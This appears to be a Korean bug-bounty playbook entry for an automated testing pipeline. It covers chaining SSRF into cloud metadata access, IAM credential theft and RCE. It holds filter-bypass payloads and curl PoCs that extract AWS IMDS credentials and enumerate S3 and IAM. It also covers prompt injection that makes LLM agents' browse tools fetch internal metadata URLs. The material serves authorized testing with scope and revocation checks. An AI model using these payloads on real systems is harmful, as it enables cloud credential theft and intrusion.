# Scenario: SSRF → Cloud Metadata → IAM Credentials → RCE

> Critical 밴드의 대표 chain. URL preview/webhook/pdf-render/pdf2img/image-proxy 류
> 기능이 있는 거의 모든 SaaS가 타겟. SSRF 자체는 Medium이지만 cloud pivot으로
> Critical까지 escalate.

## 1. Threat Model
- **타겟**: URL fetcher, webhook dispatcher, image proxy, SSR HTML rendering, PDF export, OEmbed, OpenGraph preview, LLM agent의 browse tool
- **공격자**: unauthenticated 또는 저권한 인증 사용자 (URL 제출 가능)
- **Impact**: 내부 서비스 접근 → cloud metadata → IAM role creds → S3/RDS/Lambda RCE
- **VRT**: `server_security_misconfiguration.ssrf.internal` (P2) / chained AWS RCE (P1)
- **CVSS anchor**: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.8-10.0)

## 2. Discovery Signals
- 사용자 입력 URL을 서버가 fetch: `/api/preview`, `/webhook/test`, `/import/csv`, `/export/pdf`
- SSO/SAML assertion consumer URL
- OpenGraph/OEmbed 처리기: `<link rel="alternate">` 해석
- LLM agent `tools=[web_browse]` — prompt injection으로 내부 URL 유도
- CORS proxy / image resize proxy
- git clone, wget 기반 CI/CD

## 3. Exploit Chain
```
A. URL input 탐지 → 내부 IP (127.0.0.1, 169.254.169.254, 10.0.0.0/8) 시도
B. 필터 우회 테크닉 매칭:
   - DNS rebinding (rbndr.us, lock.cmpxchg8b.com)
   - URL parser 차이 (http://evil@metadata/)
   - IP 표기 (0x, octal, IPv6 mapped, enclosed)
   - 리다이렉트 체인 (3xx → 169.254)
   - gopher:// ftp:// file:// dict:// 등 스킴
C. AWS 케이스: IMDSv2 token → role creds 요청
   - IMDSv2 uses PUT /latest/api/token then GET with header
   - v1만 열린 경우: GET /latest/meta-data/iam/security-credentials/{role}
D. GCP 케이스: Metadata-Flavor: Google 필수 (SSRF이 헤더 삽입 가능해야)
E. Azure 케이스: IMDS 169.254.169.254/metadata/identity/oauth2/token
F. creds 추출 → aws-cli assume → S3 list → secret exfil or RCE pivot
```

**주요 우회**:
- AWS IMDSv2 강제 시 SSRF이 PUT 가능한지 + 헤더 제어 가능한지 확인
- EKS/ECS task role: `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 환경변수 (169.254.170.2)
- K8s: kubelet API (10250), service account token 파일

## 4. PoC Template

```bash
# Blind SSRF 확인 — Burp Collaborator / interactsh
curl -X POST -d 'url=https://xxx.oast.site/' https://target.example/api/preview

# IMDSv1 (deprecated이지만 legacy 시스템 존재)
curl -s https://target.example/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (SSRF이 헤더 제어 가능할 때)
curl -s "https://target.example/api/preview?url=http://169.254.169.254/latest/api/token" \
  -H "X-Forwarded-For: 1.1.1.1" \
  --data-urlencode "extra_header=X-aws-ec2-metadata-token-ttl-seconds:21600"

# DNS rebinding 페이로드 (1.1.1.1.169.254.169.254.rbndr.us 패턴)
echo "http://spoofed.burpcollaborator.net/" | tee payload.txt

# IMDSv1 creds → aws-cli
export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Token creds.json)
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name "$ROLE"
```

```python
# Python: SSRF filter bypass via parser differential
from urllib.parse import urlparse
# Target applies urlparse(url).hostname then blocks "169.254.169.254"
# But requests.get actually uses different parsing
payload = "http://169.254.169.254#@target.example/"  # parser differential
# 또는
payload = "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"  # IPv6 mapped
```

## 5. Evidence Tier
- **E1**: IAM 실제 creds 추출 + `aws sts get-caller-identity` 결과 + 프로덕션 리소스 나열 (S3 bucket 실명)
- **E2**: IMDS 응답 캡처 (role 이름, creds 필드 보임), 하지만 creds 사용은 authorization 문제로 생략
- **E3**: 내부 IP 200 응답만 캡처 (credential 노출 없음)
- **E4**: DNS callback만 확인 (blind SSRF)

## 6. Gate 1 / Gate 2 체크
- [ ] **Scope check**: 프로덕션 호스트? staging/lab에서 얻은 creds로 프로덕션 주장 금지
- [ ] **Data handling**: exfil한 creds는 즉시 revoke 요청 + 사용 기록 최소화 (authorized testing 경계)
- [ ] **Duplicate**: 동일 endpoint SSRF 기제보? IMDSv2 강제 패치 이후인지 확인
- [ ] **OOS check**: 일부 프로그램은 "SSRF to internal-only metadata" OOS — In-Scope 인지 확인
- [ ] **Live vs mock**: Burp Collaborator 콜백만으로는 E2 한계. actual creds 없이 "Critical" 주장 금지

## 7. Variants / Chains
- **Blind SSRF** — timing 기반 내부 호스트 매핑
- **POST-body SSRF** — XML/SVG/SOAP 파싱 중 외부 엔티티 해석 (XXE)
- **Smuggling via redirect** — 외부 서버에서 3xx → 내부 target
- **PDF render SSRF** — Puppeteer/wkhtmltopdf headless 브라우저 via `<link>` 태그
- **LLM browse tool SSRF** — indirect prompt injection → agent가 169.254 fetch 유도
- **Webhook → XXE** — SOAP envelope의 DOCTYPE
- **AWS API Gateway integration** — gateway가 backend로 proxy할 때 path traversal
- **GCP Cloud Run metadata** — Workload Identity → GKE SA token 유사 체인

## 8. References
- OWASP — https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PortSwigger — https://portswigger.net/web-security/ssrf
- Orange Tsai BH 2017 — "A New Era of SSRF" (URL parser 차이 고전)
- Capital One 2019 breach — IMDSv1 + WAF SSRF (IMDSv2 등장 배경)
- HackerOne Top SSRF disclosures (Shopify, Gitlab, Jira Cloud)
- AWS 공식 — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

## 관련 Terminator 파이프라인
- Phase 0.5 scout: URL 입력 받는 endpoint 카탈로그 작성
- Phase 2 exploiter: nuclei `ssrf`/`oast` 템플릿 + ffuf wordlist (`internal_urls.txt`)
- Gate 2: IMDSv2 강제 시 "SSRF → metadata" chain E4로 강등 주의
